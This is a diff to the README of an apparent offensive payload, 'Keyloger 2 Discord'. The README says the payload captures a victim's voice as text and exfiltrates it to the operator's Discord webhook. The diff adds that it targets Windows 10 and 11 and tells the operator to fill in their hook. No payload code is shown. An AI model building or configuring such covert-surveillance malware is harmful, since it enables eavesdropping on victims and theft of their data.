@@ -1,6 +1,8 @@
 # Keyloger 2 Discord
 
-This payload exfills user voice as text to discord
+This payload exfills user voice as text to discord.
+
+**It targets Windows 10, 11**
 
 You must edit the following parameters on the payload:
 * Hook - your Discord hook
